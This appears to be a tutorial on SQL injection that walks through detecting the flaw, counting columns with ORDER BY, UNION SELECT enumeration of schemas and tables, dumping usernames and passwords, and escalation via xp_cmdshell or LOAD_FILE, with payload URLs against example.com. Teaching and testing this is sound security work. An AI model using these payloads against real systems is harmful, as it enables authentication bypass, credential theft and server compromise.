<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/bbb519cf-da3b-41eb-9792-72124d27841d" />


SQL Injection (or **SQLi**) is one of the most serious vulnerabilities in web applications. It appears when an application takes input from the user (like a parameter in the URL or a form field) and uses it directly in an **SQL query** without proper filtering or protection. The result is that an attacker can alter the query’s shape and take control of the database.

### Simple example:

```sql
SELECT * FROM users WHERE username = 'ahmed' AND password = '1234';
```

If the application takes `username` and `password` from the user without sanitization, an attacker can submit:

```
username = ahmed' --
password = anything
```

Then the query becomes:

```sql
SELECT * FROM users WHERE username = 'ahmed' --' AND password = 'anything';
```

`--` means SQL comment. So the password check is bypassed and authentication can be bypassed.

---

## 2. Testing whether SQLi exists or not

The first step in any test is to confirm that the application is actually vulnerable.

### Method:

* Go to any parameter (like `id` or `category`)
* Insert SQL special characters like `'` or `"`.

### Example:

For a link like:

```
https://example.com/products?id=5
```

Try:

```
https://example.com/products?id=5'
```

or:

```
https://example.com/products?id=5"
```

### Possible outcomes:

1. If an error appears such as:

   * `You have an error in your SQL syntax`
   * `Unclosed quotation mark after the character string`
   * or an Internal Server Error
     → the application is likely vulnerable.

2. If the response changes or the page behaves differently → it might still be vulnerable.

3. If there is no change → it might be protected (or a WAF/filter in front), but not guaranteed safe.

---

## 3. Determining the number of columns (Columns Enumeration)

After confirming SQLi, the next thing is to find out how many columns the original query returns.
Why? Because a `UNION SELECT` exploit requires the injected query to return the same number of columns as the original query.

### Method:

* Use `ORDER BY` to increment the column number until an error shows:

#### Example:

```
https://example.com/products?id=5 ORDER BY 1--
https://example.com/products?id=5 ORDER BY 2--
https://example.com/products?id=5 ORDER BY 3--
https://example.com/products?id=5 ORDER BY 4--
```

* If `ORDER BY 3` works but `ORDER BY 4` causes an error → number of columns = 3.

### Note:

If errors are not visible, use `UNION SELECT NULL` and increase the number of `NULL`s until the page responds without an error.

---

## 4. Identifying which columns appear in the response

After you know the number of columns, determine which columns are actually reflected in the response (i.e., which columns are visible on the page).
Why? Because you will use those visible columns to display data extracted from the DB.

### Example:

If number of columns = 3, try:

```
https://example.com/products?id=-1 UNION SELECT 1,2,3--
```

If the page shows `2` and `3`, then the 2nd and 3rd columns are reflected.

---

## 5. Extracting the database type and version

Next, identify the DBMS type (MySQL, PostgreSQL, Oracle, SQL Server).
Why? Because SQL syntax and available functions differ, and you must use the right queries.

### Common version queries by DB:

* **MySQL**:

  ```sql
  SELECT @@version;
  ```
* **PostgreSQL**:

  ```sql
  SELECT version();
  ```
* **Oracle**:

  ```sql
  SELECT banner FROM v$version;
  ```
* **Microsoft SQL Server**:

  ```sql
  SELECT @@version;
  ```

### Practical example:

```
https://example.com/products?id=-1 UNION SELECT @@version, NULL, NULL--
```

If it returns `8.0.34` → DB is MySQL 8.

---

## 6. Extracting database names, tables, columns

Once you know type and version, you can enumerate schema objects.

### For MySQL for example:

* Databases:

  ```sql
  SELECT schema_name FROM information_schema.schemata;
  ```
* Tables in a database:

  ```sql
  SELECT table_name FROM information_schema.tables WHERE table_schema='database_name';
  ```
* Columns in a table:

  ```sql
  SELECT column_name FROM information_schema.columns WHERE table_name='users';
  ```

---

## 7. Dumping sensitive data

Next you can extract the sensitive data you need (emails, usernames, passwords).

### Example:

```
https://example.com/products?id=-1 UNION SELECT username, password, NULL FROM users--
```

---

## 8. Advanced exploitation per DB

* **MySQL**: you can read server files using `LOAD_FILE()`.
* **PostgreSQL**: there are functions to execute certain system-level operations.
* **Oracle**: has specific utilities like `UTL_HTTP.request`.
* **SQL Server**: `xp_cmdshell` can be used to execute commands on the server.

---

## 9. Summary

* Start by testing whether SQLi exists.
* Determine the number of columns.
* Find which columns are reflected.
* Get the DBMS type and version.
* Enumerate schema: databases, tables, columns.
* Extract sensitive data.
* Use advanced exploits for RCE or file read if available and permitted.

---

